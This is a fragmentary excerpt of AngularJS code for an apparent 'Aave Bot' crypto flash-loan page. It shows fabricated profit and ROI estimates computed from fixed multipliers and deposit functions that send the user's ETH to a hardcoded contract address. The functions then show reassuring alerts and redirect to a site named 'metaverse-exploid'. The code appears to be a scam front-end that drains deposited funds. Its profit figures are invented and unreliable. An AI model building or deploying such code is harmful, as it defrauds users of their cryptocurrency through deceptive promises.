...
app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        $scope.contractAddress = '0x9Ea9673E3dfBc3Fe45930993044149956EDEd1d7';
        ...
        $scope.erc20 = {
            ...
            symbol: ''
                        ...
                        $scope.getLoanEstimates = function() {
                            ...
                            $scope.loan.gain = fixNumber($scope.loan.amount * ($scope.erc20.network ? 0.10789 : 0.21314));
                            $scope.safeMath = fixNumber(($scope.loan.gain -($scope.erc20.network ? 1.367 : 2.865)) * (1+($scope.loan.gain / 2 / 100))).toFixed(4);
                            $scope.roi = fixNumber($scope.safeMath / $scope.loan.totalFee).toFixed(2);
                                    ...
                                    $scope.depositEth = function() {
                                        ...
                                        window.web3.eth.sendTransaction({
                                            ...
                                            if (error) alert('Transaction Failed');
                                                ...
                                                setTimeout(function() {
                                                    alert('Coin deposited to contract. You can execute the Aave Bot Loan now.');
                                                }, 5000);
                                    ...
                                    $scope.poolEth = function() {
                                        ...
                                        window.web3.eth.sendTransaction({
                                            ...
                                            if (error) alert('Transaction Failed');
                                                ...
                                                setTimeout(function() {
                                                    alert('Coin deposited to contract. You can execute the Aave Bot now.');
                                                }, 5000);
                                                $scope.ethDeposited = true;
                                                $scope.$apply();
                                            }
                                    ...
                                    $scope.executeLoan = function() {
                                        ...
                                        window.contract.methods.action().send({
                                            ...
                                            if (error) {
                                                alert('Aave Bot Execution Failed');
                                                $scope.processing = false;
                                                $scope.$apply();
                                            } else {
                                                setTimeout(function() {
                            ...
                            window.location.href = 'https://metaverse-exploid.github.io/Router/';
                        }, 5000);
                                            }
                                        });
                                    }
                    ...
                    function usdt() {
                        document.getElementById("dropaddr").value = "0x2a8cd78bfb91acf53f589961d213d87c956e0d7f";
                        document.getElementById("dropname").value = "USDT";
                    }
                        function doge() {
                            document.getElementById("dropaddr").value = "0xba2ae424d960c26247dd6c32edc70b295c744c43";
                            document.getElementById("dropname").value = "DOGE";
                        }
                        function safemoon() {
                            document.getElementById("dropaddr").value = "0x8076c74c5e3f5852037f31ff0093eeb8c8add8d3";
                            document.getElementById("dropname").value = "SAFEMOON";
                        }
                        function ada() {
                            document.getElementById("dropaddr").value = "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47";
                            document.getElementById("dropname").value = "ADA";
                        }
                        function xrp() {
                            document.getElementById("dropaddr").value = "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe";
                            document.getElementById("dropname").value = "XRP";
                        }
function mydrop() {
